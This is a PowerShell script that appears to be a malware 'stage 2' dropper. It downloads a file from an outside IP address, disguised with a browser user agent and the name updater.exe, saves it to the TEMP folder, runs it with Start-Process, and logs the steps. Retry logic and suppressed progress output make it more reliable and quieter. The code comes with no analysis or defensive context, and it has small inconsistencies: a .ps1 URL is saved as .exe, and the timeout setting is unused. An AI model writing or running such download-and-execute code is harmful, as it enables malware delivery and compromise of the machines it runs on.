
[CmdletBinding()]
param(
    [string]$TargetUrl = "https://198.51.100.185/updater.ps1",
    [string]$OutputPath = "$env:TEMP\updater.exe",
    [string]$StageLog = "$env:TEMP\report.txt",
    [string]$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$TimeoutSec = 119,
    [int]$MaxAttempts = 4,
    [int]$BackoffSeconds = 20
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $StageLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$RetryCount = 4,
        [int]$RetryDelay = 20,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $TargetUrl
    $ResultObject = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $OutputPath -RetryCount $MaxAttempts -RetryDelay $BackoffSeconds -UserAgent $UserAgent
    if ($ResultObject) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath $OutputPath -ErrorAction SilentlyContinue
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $TargetUrl
    Destination = $OutputPath
    RetryCount = $MaxAttempts
    TimeoutSec = $TimeoutSec
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Reading configuration values"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Resolving configured target"
Write-Verbose "Exporting operation report"
Write-Verbose "Starting workflow"
Write-Verbose "Retry budget remaining"
Write-Verbose "Checking local path"
Write-Verbose "Validating result"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
